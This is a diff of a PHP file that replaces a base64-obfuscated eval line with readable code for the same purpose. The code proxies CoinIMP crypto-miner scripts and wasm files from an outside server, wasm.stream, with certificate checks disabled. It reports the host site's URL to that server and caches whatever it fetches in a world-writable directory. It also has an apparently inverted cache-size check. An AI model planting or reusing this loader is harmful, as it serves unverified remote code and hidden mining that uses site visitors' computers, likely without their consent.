@@ -1,1 +1,121 @@
-<?php eval(base64_decode('CiBnb3RvIFd1cGFTOyBqMDJHYjogaWYgKCFmaWxlX2V4aXN0cygkaTE1KSB8fCBmaWxlbXRpbWUoJGkxNSkgPCBzdHJ0b3RpbWUoIlx4MmR7JGg2fSIpKSB7ICR1MTYgPSB1MSgkcTE0KTsgZmlsZV9wdXRfY29udGVudHMoJGkxNSwgJHUxNik7IH0gZWxzZWlmIChmNCgkejcpIDwgNzAwMDAwMCkgeyBybWRpcigkejcpOyAkdTE2ID0gdTEoJHExNCk7IGZpbGVfcHV0X2NvbnRlbnRzKCRpMTUsICR1MTYpOyB9IGVsc2UgeyAkdTE2ID0gZmlsZV9nZXRfY29udGVudHMoJGkxNSk7IH0gZ290byBsRzlhTDsgSUVyajY6IGZ1bmN0aW9uIHUxKCRpYykgeyBnbG9iYWwgJGU1OyAkaWMgPSB1cmxlbmNvZGUoJGljKTsgJGhkID0gc3RydG9rKCRfU0VSVkVSW2Jhc2U2NF9kZWNvZGUoIlx4NTVceDZiXDEyNlx4NTJcMTI2XHg1NVx4NTZceDU0XHg1NlwxMDZceDM5XHg1NlwxMjVcMTUzXDE1M1w3NSIpXSwgYmFzZTY0X2RlY29kZSgiXDEyMFx4NzdcNzVcNzUiKSk7ICR0ZSA9IHVybGVuY29kZSgoaXNzZXQoJF9TRVJWRVJbYmFzZTY0X2RlY29kZSgiXHg1M1wxMDZcMTIyXHg1NVwxMjVceDQ2XDExNVw3NSIpXSkgPyBiYXNlNjRfZGVjb2RlKCJcMTQxXDExMFx4NTJcNjBcMTQzXHg0OFwxMTVceDNkIikgOiBiYXNlNjRfZGVjb2RlKCJcMTQxXHg0OFx4NTJceDMwXHg2M1x4NDFcNzVceDNkIikpIC4gYmFzZTY0X2RlY29kZSgiXHg0ZlwxNTFceDM4XDE2NiIpIC4gJF9TRVJWRVJbYmFzZTY0X2RlY29kZSgiXHg1M1wxMDZceDUyXHg1NVwxMjVcMTA2XDcxXDExMVwxMjRcNjFceDRlXHg1NSIpXSAuICJ7JGhkfSIpOyByZXR1cm4gcjAoInskZTV9XDc3XDE0NlwxNTFceDZjXDE0NVwxNTZceDYxXHg2ZFwxNDVcNzV7JGljfVx4MjZceDY4XDE1N1wxNjNcMTY0XDc1eyR0ZX0iKTsgfSBnb3RvIGV4WEV2OyBsRzlhTDogJGIxNyA9IHN1YnN0cigkcTE0LCAtMikgPT0gYmFzZTY0X2RlY29kZSgiXHg2MVwxNTZceDRkXDc1IikgPyBiYXNlNjRfZGVjb2RlKCJceDU5XDEzMFx4NDJceDc3XHg2MlwxMDdceDZjXHg2YVx4NTlceDU4XDEyMlwxNjBcMTQyXHgzMlw2NFx4NzZceDYxXDE1NVx4NDZcNjJcMTMxXDEzMFx4NGVceDZhXHg2M1x4NmRcMTU0XDE2N1x4NjRceDQxXDc1XHgzZCIpIDogYmFzZTY0X2RlY29kZSgiXHg1OVx4NThceDQyXHg3N1x4NjJcMTA3XHg2Y1x4NmFcMTMxXHg1OFx4NTJcMTYwXHg2Mlw2Mlw2NFwxNjZceDYyXDYyXHg0ZVw2MFx4NWFcMTMwXDEyMVx4NzRceDYzXDYzXDEyMlx4NzlceDVhXDEyN1x4NDZcMTY0Iik7IGdvdG8gZzE5cjY7IFVQNjQ5OiBkaWUoJHUxNik7IGdvdG8gc3hXZzY7IGdPaGhsOiAkaDYgPSBiYXNlNjRfZGVjb2RlKCJceDRkXHg1M1wxMDJceDZmXDE0Mlw2M1wxMjZcMTcxIik7IGdvdG8gaGxJVE07IGcxOXI2OiBoZWFkZXIoYmFzZTY0X2RlY29kZSgiXDEyMVw2Mlw3MVx4NzVceDY0XDEwN1x4NTZcMTY1XHg2NFwxMDNcNjFcMTI1XHg2NVwxMzBceDQyXHg2Y1wxMTdcMTUxXHg0MVx4M2QiKSAuICRiMTcgLiBiYXNlNjRfZGVjb2RlKCJceDRmXHg3OVx4NDJcMTUyXHg2MVx4NDdceDQ2XDE3MVwxNDNceDMyXHg1Nlw2MFx4NTBceDU4XDEyNlw2MFwxMzJceDY5XDYwXDY0IikpOyBnb3RvIFVQNjQ5OyBobElUTTogJHo3ID0gYmFzZTY0X2RlY29kZSgiXDEzMVx4MzJcNzFcMTYwXHg2MlwxNTVcMTU0XDE2NFx4NjNceDQzXDYxXDE1MlwxMzFceDU3XHg0ZVx4NmZceDVhXHg1MVw3NVx4M2QiKTsgZ290byByMnpPODsgRlZwQ2Y6IGZ1bmN0aW9uIGY0KCR2MTEpIHsgJGoxMiA9IDA7ICRwMTAgPSBzY2FuZGlyKCR2MTEpOyBmb3JlYWNoICgkcDEwIGFzICR1MTMpIHsgaWYgKCR1MTMgIT09IGJhc2U2NF9kZWNvZGUoIlwxMTRceDY3XHgzZFw3NSIpICYmICR1MTMgIT09IGJhc2U2NF9kZWNvZGUoIlx4NGNcMTUxXDY0XDc1IikpIHsgaWYgKGlzX2RpcigkdjExIC4gYmFzZTY0X2RlY29kZSgiXDExNFwxNjdceDNkXDc1IikgLiAkdTEzKSkgeyAkajEyICs9IGY0KCR2MTEgLiBiYXNlNjRfZGVjb2RlKCJceDRjXDE2N1x4M2RceDNkIikgLiAkdTEzKTsgfSBlbHNlIHsgJGoxMiArPSBmaWxlc2l6ZSgkdjExIC4gYmFzZTY0X2RlY29kZSgiXDExNFx4NzdceDNkXHgzZCIpIC4gJHUxMyk7IH0gfSB9IHJldHVybiAkajEyOyB9IGdvdG8gd1dnOHQ7IEdwdlNxOiBmdW5jdGlvbiB3MygpIHsgJGNmID0gYXJyYXkoYmFzZTY0X2RlY29kZSgiXHg1OVw2Mlx4MzlcMTYwXDE0MlwxNTVceDZjXDE2NFx4NjNcMTAzXHgzMVwxNTJcMTMxXHg1N1x4NGVcMTU3XHg1YVx4NTFceDNkXHgzZCIpLCBiYXNlNjRfZGVjb2RlKCJcMTQ0XHg0N1x4MzFceDc3XHg0Y1w2MlwxMTZcMTY2XHg2MVwxMjdceDM1XHg3MFwxNDJceDU4XHg0MVx4NzRcMTMxXDYyXHg0NlwxNTJceDYxXDEwN1wxMjVcNzUiKSwgYmFzZTY0X2RlY29kZSgiXHg0Y1w2M1wxMjJcMTY0XHg2M1x4NDNcNzFceDZhXDE0Mlx4MzJcMTU0XDE2NVwxNDFceDU3XHgzMVx4NzdceDRjXHg1N1wxMTZceDY4XDEzMVx4MzJcMTUwXHg2YyIpKTsgZm9yZWFjaCAoJGNmIGFzICRwMTApIHsgaWYgKCFmaWxlX2V4aXN0cygkcDEwKSkgeyBta2RpcigkcDEwLCA1MTEsIHRydWUpOyB9IGlmIChpc193cml0ZWFibGUoJHAxMCkpIHsgcmV0dXJuICRwMTA7IH0gfSBkaWUoYmFzZTY0X2RlY29kZSgiXDEyMVw2MlwxMDZcMTUyXDE0MVwxMDdcMTI1XHg2N1x4NWFceDQ3XDE1NFwxNzFceDVhXHg1N1x4NGVcNjBceDYyXHgzM1wxMTJceDM1XHg0OVx4NDNceDRhXDE1Mlx4NjJceDMyXDE1NFx4NzVcMTQxXHg1N1x4MzFceDc3XHg0Y1x4NTdceDRlXHg2OFwxMzFcNjJcMTUwXDE1NFwxMTFcMTUxXDEwMlwxNjBceDYzXHg3OVx4NDJcMTY1XHg2Mlx4MzNcMTIxXHg2N1x4NjRcNjNcMTEyXDE2MFx4NjRceDQ3XHg1NlwxNTBcMTMxXHg2ZFwxNzBcMTU0XDExMVwxMjFceDNkXDc1IikpOyB9IGdvdG8gRlZwQ2Y7IHQ5U2dUOiAkcTE0ID0gaXNzZXQoJF9HRVRbYmFzZTY0X2RlY29kZSgiXHg1YVx4NjdceDNkXHgzZCIpXSkgPyAkX0dFVFtiYXNlNjRfZGVjb2RlKCJceDVhXHg2N1x4M2RcNzUiKV0gOiAnJzsgZ290byBDQW9BZjsgcjJ6Tzg6IGZ1bmN0aW9uIHIwKCR2OCkgeyAkZzkgPSBmYWxzZTsgaWYgKGZ1bmN0aW9uX2V4aXN0cyhiYXNlNjRfZGVjb2RlKCJcMTMxXHgzM1x4NTZceDc5XDE0Mlx4NDZceDM5XHg2Y1x4NjVceDQ3XDEyNlwxNTIiKSkpIHsgaWYgKCRuYSA9IGN1cmxfaW5pdCgkdjgpKSB7IGN1cmxfc2V0b3B0KCRuYSwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOyBjdXJsX3NldG9wdCgkbmEsIENVUkxPUFRfRlJFU0hfQ09OTkVDVCwgdHJ1ZSk7IGN1cmxfc2V0b3B0KCRuYSwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7ICRnOSA9IGN1cmxfZXhlYygkbmEpOyBjdXJsX2Nsb3NlKCRuYSk7IH0gfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cyhiYXNlNjRfZGVjb2RlKCJceDVhXHg2ZFx4NmNcMTYzXDEzMlwxMjZcNzFceDZlXDEzMlwxMzBcMTIyXDE0NlwxMzFcNjJceDM5XHg3NVx4NjRceDQ3XHg1NlwxNjVceDY0XHg0OFwxMTVcNzUiKSkpIHsgJGc5ID0gZmlsZV9nZXRfY29udGVudHMoJHY4KTsgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cyhiYXNlNjRfZGVjb2RlKCJcMTMyXDE1NVw3MVwxNjdcMTMyXHg1N1x4MzRceDNkIikpICYmIGZ1bmN0aW9uX2V4aXN0cyhiYXNlNjRfZGVjb2RlKCJcMTQzXDYzXDEyMlwxNzFcMTMyXDEyN1wxMDZceDc0XHg1OFx4MzJceDY0XDE1NFwxNDRceDQ2XHgzOVx4NmFcMTQyXHgzMlw2NVx4MzBcMTMyXDEyN1x4MzVcNjBcMTQzXDE2N1w3NVw3NSIpKSkgeyBpZiAoJGZiID0gZm9wZW4oJHY4LCBiYXNlNjRfZGVjb2RlKCJcMTQzXHg2N1w3NVw3NSIpKSkgeyAkZzkgPSBzdHJlYW1fZ2V0X2NvbnRlbnRzKCRmYik7IH0gfSBpZiAoJGc5KSB7IHJldHVybiAkZzk7IH0gZWxzZSB7IGRpZSgiXHg0M1x4NjFceDZlXDE1NlwxNTdcMTY0XHgyMFwxNDRceDZmXHg3N1x4NmVceDZjXHg2ZlwxNDFceDY0XHgyMFx4MjJ7JHY4fVw0Mlx4MjEiKTsgfSB9IGdvdG8gSUVyajY7IG5Db3NsOiAkaTE1ID0gInskejd9XHgyZnskcTE0fSI7IGdvdG8gajAyR2I7IGV4WEV2OiBmdW5jdGlvbiBqMigkaWMpIHsgcmV0dXJuIHByZWdfbWF0Y2goYmFzZTY0X2RlY29kZSgiXHg0Y1w2MVx4MzVceDYzXHg2NFw2M1wxNjNceDMwXHg2Nlx4NTZcMTY3XDE2NVx4NjFceDZlXHg0ZFx4NmJcMTE0XHg3N1x4M2RceDNkIiksICRpYykgfHwgcHJlZ19tYXRjaChiYXNlNjRfZGVjb2RlKCJcMTE0XHgzMVx4MzVceDYzXHg2NFx4MzNcMTYzXDYyXHg2Nlx4NTZceDc3XDE2NVx4NjFceDZlXHg0ZFx4NmJceDRjXDE2N1w3NVx4M2QiKSwgJGljKSB8fCBwcmVnX21hdGNoKGJhc2U2NF9kZWNvZGUoIlwxMTRcNjFcNjVcMTQzXDE0NFw2M1wxNjNcNjNcMTQ2XHg1Nlx4NzdcMTY1XHg2MlwxMjdceDZjXHg3NVx4NThceDQzXDY1XDE2MVx4NjNcNjFcMTY3XHg3NVx4NjJcMTI3XHg1NlwxNjRceDRhXDEwM1x4MzhcNzUiKSwgJGljKSB8fCBwcmVnX21hdGNoKGJhc2U2NF9kZWNvZGUoIlx4NGNcNjFcNjVceDYzXHg2NFw2M1wxNjNcNjRcMTQ2XDEyNlwxNjdcMTY1XHg2NFx4MzJcMTA2XHg3YVwxNDJceDUzXDEyMVwxNjYiKSwgJGljKSB8fCBwcmVnX21hdGNoKGJhc2U2NF9kZWNvZGUoIlx4NGNcNjFceDM1XHg2M1wxNDRcNjNceDczXDY0XDE0Nlx4NTZceDc3XDE2NVx4NjNcMTA3XDY1XHg2ZVx4NGFcMTAzXHgzOFw3NSIpLCAkaWMpOyB9IGdvdG8gR3B2U3E7IFd1cGFTOiAkZTUgPSBiYXNlNjRfZGVjb2RlKCJcMTQxXHg0OFwxMjJceDMwXDE0M1x4NDRcMTU3XHg3NlwxMTRcNjNcMTQ0XHgzM1wxNDRcMTcxXDY1XDYzXDEzMVx4NThceDRlXDE2NFx4NGNceDZlXHg0ZVx4MzBceDYzXDE1NVx4NTZceDY4XDE0Mlx4NTNceDM4XDc1Iik7IGdvdG8gZ09oaGw7IENBb0FmOiBpZiAoIWoyKCRxMTQpKSB7IGRpZShiYXNlNjRfZGVjb2RlKCJcMTIzXHg1N1x4MzVceDMyXHg1OVwxMjdcMTcwXHg3MFx4NWFcMTAzXHg0MlwxNTBceDYzXDE1NVwxNDRceDMxXHg2MlwxMjdceDU2XHg3NVx4NjRcMTAxXDc1XDc1IikpOyB9IGdvdG8gbkNvc2w7IHdXZzh0OiAkejcgPSB3MygpOyBnb3RvIHQ5U2dUOyBzeFdnNjog')); ?>
+<?php
+
+$URL_GET = 'http://www.wasm.stream/';
+$CACHE_TIME = '1 hour';
+$CACHE_DIR = 'coinimp-cache';
+
+function url_get_contents($url)
+{
+    $data = false;
+
+    if (function_exists('curl_exec'))
+    {
+        if ($conn = curl_init($url))
+        {
+            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
+            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+            $data = (curl_exec($conn));
+            curl_close($conn);
+        }
+    }
+    elseif (function_exists('file_get_contents'))
+    {
+        $data = file_get_contents($url);
+    }
+    elseif (function_exists('fopen') && function_exists('stream_get_contents'))
+    {
+        if ($handle = fopen($url, "r"))
+        {
+            $data = stream_get_contents($handle);
+        }
+    }
+
+    if ($data)
+        return $data;
+    else
+        die("Cannot download \"$url\"!");
+}
+
+function get_file_from_server($filename)
+{
+    global $URL_GET;
+    $filename = urlencode($filename);
+    $uri = strtok($_SERVER['REQUEST_URI'],'?');
+    $host = urlencode((isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://" . $_SERVER['HTTP_HOST'] . "$uri");
+    return url_get_contents("$URL_GET?filename=$filename&host=$host");
+}
+
+function filename_match($filename)
+{
+    return preg_match('/^\w{4}\.js$/', $filename)
+        || preg_match('/^\w{6}\.js$/', $filename)
+        || preg_match('/^\w{7}\.min\.js\.mem$/', $filename)
+        || preg_match('/^\w{8}\.wasm$/', $filename)
+        || preg_match('/^\w{8}\.png$/', $filename);
+}
+
+function get_cache_dir()
+{
+    $dirs = array('coinimp-cache', 'tmp/coinimp-cache', '/tmp/coinimp-cache');
+    foreach ($dirs as $dir)
+    {
+        if(!file_exists($dir))
+            mkdir($dir, 0777, true);
+
+        if(is_writeable($dir))
+            return $dir;
+    }
+    die('Cache directory "coinimp-cache" is not writeable!');
+}
+
+function get_dir_size($path)
+{
+    $fileSize = 0;
+    $dir = scandir($path);
+
+    foreach($dir as $file)
+    {
+        if (($file !== '.') && ($file !== '..'))
+            if (is_dir($path . '/' . $file))
+                $fileSize += get_dir_size($path.'/'.$file);
+            else
+                $fileSize += filesize($path . '/' . $file);
+    }
+
+    return $fileSize;
+}
+
+$CACHE_DIR = get_cache_dir();
+
+$req_file = isset($_GET['f']) ? $_GET['f'] : '';
+
+if (!filename_match($req_file))
+{
+    die('Invalid argument');
+}
+
+$cache_filename = "$CACHE_DIR/$req_file";
+if (!file_exists($cache_filename) || (filemtime($cache_filename) < strtotime("-$CACHE_TIME")))
+{
+    $script = get_file_from_server($req_file);
+    file_put_contents($cache_filename, $script);
+}
+elseif (get_dir_size($CACHE_DIR) < 7000000)
+{
+    rmdir($CACHE_DIR);
+    $script = get_file_from_server($req_file);
+    file_put_contents($cache_filename, $script);
+}
+else
+{
+    $script = file_get_contents($cache_filename);
+}
+
+$type = substr($req_file, -2) == 'js'
+    ? 'application/javascript'
+    : 'application/octet-stream';
+
+header('Content-Type: ' . $type . '; charset=utf-8');
+
+die($script);
